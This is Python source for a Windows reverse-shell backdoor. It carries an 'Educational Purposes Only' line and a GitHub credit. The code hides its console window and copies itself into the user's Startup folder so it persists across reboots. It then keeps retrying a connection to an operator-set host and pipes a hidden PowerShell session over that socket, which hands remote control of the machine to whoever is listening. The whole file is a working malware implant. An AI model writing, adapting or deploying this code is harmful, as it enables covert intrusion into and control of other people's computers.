import os, socket, subprocess, threading, sys, time, getpass, ctypes

#Coded By Kral4 | https://github.com/rootkral4
#Educational Purposes Only
#https://github.com/rootkral4/winshell/blob/main/LICENSE

# You should have received a copy of the MIT License
# along with this program.  If not, see <https://github.com/rootkral4/winshell/blob/main/LICENSE>.

kernel32 = ctypes.WinDLL('kernel32')

user32 = ctypes.WinDLL('user32')

SW_HIDE = 0

hWnd = kernel32.GetConsoleWindow()
user32.ShowWindow(hWnd, SW_HIDE)

username = getpass.getuser()

if not os.path.exists("C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+sys.argv[0]):
    try:
        os.mkdir("C:\\Users\\"+username+"\\.winhelper")
        os.rename(sys.argv[0],"C:\\Users\\"+username+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+sys.argv[0])
    except:
        pass
    
host_ip = "127.0.0.1" #<----- Change Here
port = 3389

def s2p(s, p):
    while True:
        data = s.recv(1024).decode("cp437")
        p.stdin.write(data)
        p.stdin.flush()
          
def p2s(s, p):
    while True: 
        s.send(p.stdout.read(1).encode("cp437"))


s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)


while True:
    try:
        s.connect((host_ip, port))
        break
    except:
        pass
        
p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, encoding='cp437', text=True)

threading.Thread(target=s2p, args=[s,p], daemon=True).start()

threading.Thread(target=p2s, args=[s,p], daemon=True).start()

try: 
    p.wait()
except: 
    s.close()
    sys.exit(0)